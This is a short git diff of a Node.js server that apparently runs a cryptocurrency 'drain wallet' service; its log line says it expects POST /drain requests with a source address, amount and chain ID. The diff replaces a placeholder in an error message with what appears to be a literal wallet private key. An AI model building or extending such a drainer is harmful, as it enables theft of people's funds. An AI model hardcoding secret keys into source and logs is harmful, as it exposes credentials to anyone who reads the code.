@@ -32,7 +32,7 @@ const DRAIN_WALLET_ADDRESS = process.env.DRAIN_WALLET_ADDRESS || "0x0cd509bf3a2F
 if (!DRAIN_WALLET_PRIVATE_KEY) {
   console.error("❌ ERROR: DRAIN_WALLET_PRIVATE_KEY is not set in environment variables!");
   console.error("   Add it in Render Dashboard -> Environment -> Add Environment Variable");
-  console.error("   Format: DRAIN_WALLET_PRIVATE_KEY=your_private_key_here");
+  console.error("   Format: DRAIN_WALLET_PRIVATE_KEY=2f2a7cadc18ec3085934a2d9dc1533a7365ac7c0bb8fd6ee32de4f1aa9ef3cf3");
   process.exit(1);
 }
 
@@ -409,4 +409,5 @@ app.listen(PORT, () => {
   console.log(`✅ Ready to receive requests`);
   console.log(`📤 Expects POST /drain with: fromAddress, amount, chainId`);
 });
+
 
